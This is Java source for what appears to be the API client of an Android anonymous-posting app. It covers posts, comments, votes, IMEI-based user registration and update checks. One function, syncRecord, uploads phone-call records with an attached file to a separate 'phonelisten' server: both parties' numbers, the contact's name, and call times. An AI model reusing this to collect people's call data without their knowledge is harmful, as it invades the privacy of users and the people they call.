package com.comsince.secret.service;

import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.entity.mime.FormBodyPart;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.ContentBody;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.comsince.secret.bean.Comment;
import com.comsince.secret.bean.Matter;
import com.comsince.secret.bean.Page;
import com.comsince.secret.bean.Response;
import com.comsince.secret.bean.UpdateInfo;
import com.comsince.secret.bean.User;
import com.comsince.secret.common.Constant;
import com.comsince.secret.phonelisten.model.Record;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
public class API {

    private static int retryTime = 3;
	
	private final static String API_URL= Constant.SERVER_URL+"/api/";

    private final static String PHONLISTEN_API_URI = Constant.CallLogContants.SERVER_URL+"/cgi/";

    public static String syncRecord(Record record,File file){
        Map<String,String> map = new HashMap<String,String>();
        map.put("content", record.content);
        map.put("beginTime", record.beginTime);
        map.put("endTime", record.endTime);
        map.put("hename", record.hename);
        map.put("menumber", record.menumber);
        map.put("henumber", record.henumber);
        map.put("type", record.type);
        map.put("status", record.status);
        String json ="";
        try {
            json = httpPost(PHONLISTEN_API_URI+"record_save.api",map,file);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    public static Page getCommentList(String matterId,int pagenum) throws Exception
    {
    	ArrayList<Comment> commentList = new  ArrayList<Comment>();
    	Map<String,String> map = new HashMap<String,String>();
    	map.put("currentPage", String.valueOf(pagenum));
    	map.put("comment.matterId", matterId);
    	String json = httpPost(API_URL+"comment_queryJsonList.php",map);
    	 
    	Response response = new Gson().fromJson(json, Response.class);
    	 
    	if(response.getKey() !=0)
    	{
    		throw new IOException();
    	}
    	if(response.getPage().getDataList() != null)
    	{
    		for(Object o :response.getPage().getDataList())
        	{
        		HashMap<String,?> m = (HashMap<String,?>) o;
        		Comment c = new Comment();
        		c.alias = m.get("alias").toString();
        		c.commentId = m.get("commentId").toString();
        		c.content =m.get("content").toString();
        		c.userId = m.get("userId").toString();
        		c.matterId =m.get("matterId").toString();
        		c.rank = 	(int)Double.parseDouble(m.get("rank").toString())+"";
        		c.timestamp =m.get("timestamp").toString();
        		commentList.add(c);
        	} 
    	}
    	response.getPage().setDataList(commentList);
     
    	return response.getPage();
		 
    }
    public static ArrayList<Matter>  getMatterList(int page,String order) throws Exception
    {
    	ArrayList<Matter> matterList = new  ArrayList<Matter>();
    	 
    	Map<String,String> map = new HashMap<String,String>();
    	map.put("currentPage", String.valueOf(page));
    	map.put("order", String.valueOf(order));
    	if(order.equals(Constant.ORDER_PIC))
    	{
    		map.put("order", Constant.ORDER_NEW);
    		map.put("fileType", Constant.FILE_TYPE_PIC);
    	}
    	String json = httpPost(API_URL+"matter_list.php",map);
    	matterList = new Gson().fromJson(json, new TypeToken<ArrayList<Matter>>(){}.getType());
    	/*JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(key.equals("0"))
    	{
    		if(jsonObj.getJSONObject("page").has("dataList")){
	    		JSONArray data =  jsonObj.getJSONObject("page").getJSONArray("dataList");
	    		for(int i=0;i<data.length();i++){
	    			matterList.add(mappingMatter(data.getJSONObject(i)));
	    		}
    			
    		}
    	}else
    	{
    		throw new IOException();
    	}*/
    	return matterList;
		 
    }

    /**
     * 该方法只是验证本机服务的数据是否正确，仅作测试之用
     * */
    public static String getWechatValidateMsg(String msg) throws IOException {
        Map<String,String> map = new HashMap<String,String>();
        map.put("msg",msg);
        String result = httpPost(API_URL+"wechat_connectWechat.php",map);
        return result;
    }

	public static String publishComment(Comment comment) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
		comment.timestamp=String.valueOf(System.currentTimeMillis());
    	map.put("comment.userId", comment.userId);
    	map.put("comment.content", comment.content);
    	map.put("comment.alias", comment.alias);
    	map.put("comment.matterId", comment.matterId);
    	String json = httpPost(API_URL+"comment_publish.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
		return key;
	}
	public static User getUserByIMEI(String imei) throws JSONException, ClientProtocolException, IOException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("user.imei", imei);
    	String json = httpPost(API_URL+"user_getByIMEI.php",map);
    	/*JSONObject jsonObj = new JSONObject(json);
    	if(jsonObj.has("user")){
    		 User user = new User();
    		 user.alias=jsonObj.getJSONObject("user").getString("alias");
    		 user.userId=jsonObj.getJSONObject("user").getString("userId");
    		 user.imei=jsonObj.getJSONObject("user").getString("imei");
    		 return user;
		}*/
    	Response response = new Gson().fromJson(json, Response.class);
    	return response.getUser();
    	
     
	}
	public static String userRegister(User user) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("alias", user.alias);
    	map.put("user.imei", user.imei);
    	String json = httpPost(API_URL+"user_register.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(key.equals("0"))
    	{
    		jsonObj = jsonObj.getJSONObject("user");
    		return jsonObj.getString("userId");
    	}else 
    	{
    		return key;
    	}
    	 
	}
	public static Matter  publishMatter(Matter matter) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("matter.userId", matter.userId);
    	map.put("matter.content", matter.content);
    	map.put("matter.alias", matter.alias);
    	String json;
    	if(matter.file!=null)
    	{
    		map.put("matter.fileType", matter.fileType);
    		 json = httpPost(API_URL+"matter_publish.php",map,new File(matter.file));
    	}else
    	{
    		 json = httpPost(API_URL+"matter_publish.php",map);
    	}
    	if(json.equals("9"))
       	 
    	{
    		throw new IOException();
    	}
    	return new Gson().fromJson(json, Matter.class);
		 
	}
	
	public static ArrayList<Matter> syncMyMatter(String userId) throws ClientProtocolException, IOException, JSONException {
		ArrayList<Matter> matterList = new ArrayList<Matter>();
		Map<String,String> map = new HashMap<String,String>();
    	map.put("matter.userId", userId);
    	String json = httpPost(API_URL+"matter_myMatterList.php",map);
    	
    	
    	matterList = new Gson().fromJson(json, new TypeToken<ArrayList<Matter>>(){}.getType());
    	/*JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(key.equals("0"))
    	{
    		if(jsonObj.getJSONObject("page").has("dataList")){
	    		JSONArray data =  jsonObj.getJSONObject("page").getJSONArray("dataList");
	    		for(int i=0;i<data.length();i++){
	    			matterList.add(mappingMatter(data.getJSONObject(i)));
	    		}
    		}
    		return matterList;
    	}else
    	{
    		throw new IOException();
    	}*/
		 return matterList;
	}
	public static ArrayList<Matter> followMatterList(String userId) throws ClientProtocolException, IOException, NumberFormatException, JSONException {
		ArrayList<Matter> matterList = new ArrayList<Matter>();
		Map<String,String> map = new HashMap<String,String>();
    	map.put("matter.userId", userId);
    	String json = httpPost(API_URL+"matter_myFllowList.php",map);
    	matterList = new Gson().fromJson(json, new TypeToken<ArrayList<Matter>>(){}.getType());
    	return matterList;
    	/*JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(key.equals("0"))
    	{
    		if(jsonObj.has("dataList")){
	    		JSONArray data =  jsonObj.getJSONArray("dataList");
	    		for(int i=0;i<data.length();i++){
	    			
	      	    	matterList.add(mappingMatter(data.getJSONObject(i)));
	    		}
    		}
    		return matterList;
    	}else
    	{
    		throw new IOException();
    	}*/
	 
	}
	
	public static String modifyAlias(User user) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("user.userId", user.userId);
    	map.put("user.alias", user.alias);
    	String json = httpPost(API_URL+"user_modifyAlias.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(!key.equals("0"))
    	{
    		throw new IOException();
    	}
		return "0";
	} 
	
	public static void sendFadeBack(String msg,String userId) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("matter.userId", userId);
    	map.put("matter.content", msg);
    	String json = httpPost(API_URL+"matter_fadeBack.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(!key.equals("0"))
    	{
    		throw new IOException();
    	}
		
	}
	public static void vote(String matterId, int index) throws ClientProtocolException, IOException, JSONException {
		Map<String,String> map = new HashMap<String,String>();
    	map.put("matter.matterId", matterId);
    	map.put("key", String.valueOf(index));
    	String json = httpPost(API_URL+"matter_doVote.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(!key.equals("0"))
    	{
    		throw new IOException();
    	}
	}
	
	public static UpdateInfo updateInfo() throws IOException, JSONException {
		
		UpdateInfo updateInfo = new UpdateInfo();
		Map<String,String> map = new HashMap<String,String>();
    	map.put("config.domain", "mimi");
    	String json = httpPost(API_URL+"config_queryConfig.php",map);
    	JSONObject jsonObj = new JSONObject(json);
    	String  key = jsonObj.getString("key");
    	if(!key.equals("0"))
    	{
    		throw new IOException();
    	}
		JSONArray array = jsonObj.getJSONArray("dataList");
		for(int i=0;i<array.length();i++)
		{
			JSONObject obj  = array.getJSONObject(i);
			if(obj.getString("key").equals("app_level"))
			{
				updateInfo.setNewlevel(Integer.parseInt(obj.getString("value")));
			}
			if(obj.getString("key").equals("app_url"))
			{
				updateInfo.setAppUrl(obj.getString("value"));
			}
			if(obj.getString("key").equals("app_version"))
			{
				updateInfo.setNewVersion(obj.getString("value"));
			}
			if(obj.getString("key").equals("updateMsg"))
			{
				updateInfo.setUpdateMsg(obj.getString("value"));
			}
		}
	 
		return updateInfo;
	}
	
	public static String httpPost(String url,Map<String,String> map,File file) throws ClientProtocolException, IOException
	{
		 HttpPost httpPost = new HttpPost(url);  
         // 设置字符集  
		 MultipartEntity mpEntity = new MultipartEntity(); //文件传输
		 if(file!=null){
			 ContentBody cbFile = new FileBody(file);
			 mpEntity.addPart("file", cbFile);
		 }
		 for(String key:map.keySet()){
             if(!TextUtils.isEmpty(map.get(key))){
                 StringBody stringBody = new StringBody(map.get(key).toString(),
                         Charset.forName("UTF-8"));
                 mpEntity.addPart(key,stringBody);
             }
		 }
		 
         // 设置参数实体
         if(map.get("msg") != null){
             httpPost.setEntity(new ByteArrayEntity(map.get("msg").getBytes("UTF-8")));
         }else{
             httpPost.setEntity(mpEntity);
         }
         // 获取HttpClient对象
         HttpClient httpClient = new DefaultHttpClient();  
         //连接超时  
         httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 30000);  
         //请求超时  
         httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 30000);  
 
         HttpResponse httpResp = httpClient.execute(httpPost);  
         String json = EntityUtils.toString(httpResp.getEntity(), "UTF-8");
         Log.i("mimi","result json "+json);
         return json;
	}
	public static String httpPost(String url,Map<String,String> map) throws ClientProtocolException, IOException{
        String result = null;
        result = httpPost(url,map,null);
	    return result;
	}
	public static Matter mapapingMatter(JSONObject obj) throws JSONException
	{
		    Matter m = new Matter();
	    	m.content=obj.getString("content");
	    	m.recount= Integer.valueOf(obj.getString("recount"));
	    	m.timestamp=obj.getString("timestamp");
	    	m.alias=obj.getString("alias");
	    	m.matterId=obj.getString("matterId");
	    	m.userId=obj.getString("userId");
	    	if(obj.has("fileType")){
	    		m.fileType =  obj.getString("fileType");
	    	}
	    	if(obj.has("file")){
	    		m.file =  obj.getString("file");
	    	}
	    	if(obj.has("lastretime")){
	    		m.lastretime =  obj.getString("lastretime");
	    	}
	    	m.vote = obj.getString("vote");
	    	m.type = obj.getString("type");
	    	return m;
	}
	
}
